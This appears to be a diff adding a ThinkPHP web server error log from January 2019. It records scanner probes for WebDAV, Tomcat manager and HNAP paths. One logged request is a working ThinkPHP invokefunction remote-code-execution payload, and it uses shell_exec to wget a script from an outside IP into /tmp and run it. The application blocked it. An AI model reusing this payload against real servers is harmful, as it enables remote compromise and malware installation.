@@ -1,0 +1,18 @@
+[ 2019-01-07T03:08:35+08:00 ] 71.6.202.198 /ccvv
+ERR: 无法加载控制器:Ccvv
+
+[ 2019-01-07T05:58:21+08:00 ] 49.51.68.254 /webdav/
+ERR: 无法加载控制器:Webdav
+
+[ 2019-01-07T06:01:09+08:00 ] 49.51.68.254 /manager/html
+ERR: 无法加载控制器:Manager
+
+[ 2019-01-07T10:38:10+08:00 ] 14.17.3.64 /webdav
+ERR: 无法加载控制器:Webdav
+
+[ 2019-01-07T13:03:07+08:00 ] 167.99.211.98 /index.php?s=/index/\think\app/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]=cd%20/tmp;wget%20http://167.99.219.142/ex.sh;chmod%20777%20ex.sh;sh%20ex.sh
+ERR: 非法操作:\think\app
+
+[ 2019-01-07T20:58:16+08:00 ] 77.37.234.234 /HNAP1/
+ERR: 无法加载控制器:HNAP1
+
